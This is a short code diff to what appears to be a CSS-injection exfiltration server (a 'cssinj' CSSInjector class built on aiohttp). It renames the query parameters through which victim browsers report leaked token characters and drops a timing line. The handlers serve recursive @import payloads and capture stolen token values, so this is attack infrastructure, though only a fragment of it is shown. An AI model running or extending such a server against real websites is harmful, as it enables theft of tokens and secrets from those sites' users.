@@ -1,4 +1,3 @@
-import time
 import asyncio
 from aiohttp import web
 from cssinj.exfiltrator import injection
@@ -62,7 +61,7 @@ class CSSInjector:
             )
 
     async def handle_end(self, request):
-        client_id = request.query.get("client_id")
+        client_id = request.query.get("cid")
 
         client = self.clients[client_id]
         element = Element(name=self.element)
@@ -84,7 +83,7 @@ class CSSInjector:
         )
 
     async def handle_next(self, request):
-        client_id = request.query.get("client_id")
+        client_id = request.query.get("cid")
         client = self.clients[client_id]
 
         client.counter += 1
@@ -92,8 +91,6 @@ class CSSInjector:
         await client.event.wait()
 
         client.event.clear()
-
-        self.client.last_request_at = time.time()
 
         return web.Response(
             text=injection.generate_payload_recursive_import(
@@ -107,12 +104,12 @@ class CSSInjector:
         )
 
     async def handle_valid(self, request):
-        client_id = request.query.get("client_id")
+        client_id = request.query.get("cid")
         client = self.clients[client_id]
 
         client.event.set()
 
-        client.data = request.query.get("token")
+        client.data = request.query.get("t")
 
         if self.show_details:
             self.console.log(
